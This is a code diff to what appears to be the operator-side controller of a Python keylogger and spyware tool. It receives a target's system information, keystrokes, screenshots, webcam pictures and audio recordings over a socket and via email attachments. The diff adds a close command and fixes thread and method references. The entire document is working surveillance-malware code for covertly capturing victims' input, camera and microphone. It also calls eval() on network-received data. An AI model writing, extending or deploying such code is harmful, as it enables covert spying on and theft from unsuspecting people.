@@ -9,8 +9,8 @@ import logging.config
 
 
 stop_threads = False
-sys_name = platform.system().lower()
 gui_running = False
+sys_name = platform.system().lower()
 
 if sys_name == 'windows':
 	temp_path = f"C:/Users/{getpass.getuser()}/AppData/Local/Temp/"
@@ -81,7 +81,9 @@ class KeyLogger(threading.Thread):
 
 
 	def run(self):
-		system_info = self.connection.client.recv(4096).decode('utf-8')
+		global stop_threads
+
+		system_info = self.connection.client.recv(4096).decode()
 		system_info = eval(system_info)
 
 		path = '../logs/'
@@ -94,7 +96,7 @@ class KeyLogger(threading.Thread):
 		with open(os.path.join(path, filename), "w") as handler:
 			handler.write("=" * 25 + " System Information " + "=" * 25 + "\n\n")
 			handler.write(f"System: {system_info[0]['system']}\n")
-			handler.write(f"Domain name: {system_info[0]['domain_name']}/{system_info[1][0]}\n")
+			handler.write(f"Device name: {system_info[0]['device_name']}/{system_info[1][0]}\n")
 			handler.write(f"User name: {system_info[1][1]}\n")
 			handler.write(f"Release: {system_info[0]['release']}\n")
 			handler.write(f"Version: {system_info[0]['version']}\n")
@@ -111,7 +113,7 @@ class KeyLogger(threading.Thread):
 				# type = <string> image, char, wcpic(webcam picture)
 				# time = <string> current time when the key was pressed
 				# information = <string> character pressed by the target
-				data = self.connection.client.recv(max_buff_length).decode('utf-8')
+				data = self.connection.client.recv(max_buff_length).decode()
 
 				data = eval(data)
 
@@ -141,6 +143,11 @@ class KeyLogger(threading.Thread):
 						with open(f'./audio_{data[1]}.wav', 'wb') as handler:
 							handler.write(data[2])
 						logger.info('Done')
+				elif data[0] == 'close':
+					self.connection.client.close()
+					logger.info("Connection closed!\n")
+					break
+
 			except:
 				stop_threads = True
 				self.connection.client.close()
@@ -162,11 +169,11 @@ class KeyLogger(threading.Thread):
 
 					if len(id_list) > 0:
 						result, data = imap_conn.fetch(id_list[-1], '(RFC822)')
-						if email.message_from_string(data[0][1].decode())['from'] == email_address:
+						if email.message_from_string(data[0][1].decode())['from'] == self.email_address:
 							raw_message = email.message_from_bytes(data[0][1])
 
 							logger.info('Downloading email attachments...')
-							get_attachments(raw_message)
+							self.get_attachments(raw_message)
 							logger.info('Done')
 
 							if os.path.isfile(os.path.join(temp_path, filename)):
@@ -199,35 +206,39 @@ class MenuHandler(threading.Thread):
 
 
 	def run(self):
+		global stop_threads
+
 		print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")
 
 		while True:
 			option = str(input(">>> "))
 			if option.lower() == 'help':
 				print("1) Take screenshot\n2) Webcam picture\n3) Record audio\n4) Exit\n")
-			elif option == '1' or option == '2' or option == '3':
+			elif option == '1':
 				logger.info('Taking screenshot...')
 				try:
-					self.connection.client.sendall(option.encode('utf-8'))
+					self.connection.client.sendall(option.encode())
 				except:
 					break
 			elif option == '2':
 				logger.info('Taking webcam picture...')
 				try:
-					self.connection.client.sendall(option.encode('utf-8'))
+					self.connection.client.sendall(option.encode())
 				except:
 					break
 			elif option == '3':
 				logger.info('Recording audio...')
 				try:
-					self.connection.client.sendall(option.encode('utf-8'))
+					self.connection.client.sendall(option.encode())
 				except:
 					break
+			elif option == '4' or stop_threads:
+				stop_threads = True
+				logger.info("Closing the connection...")
+				self.connection.client.sendall(option.encode())
+				break
 			elif option == '':
 				pass
-			elif option == '4' or stop_threads:
-				logger.info('Exit')
-				break
 			else:
 				print("Wrong option!\n")
 
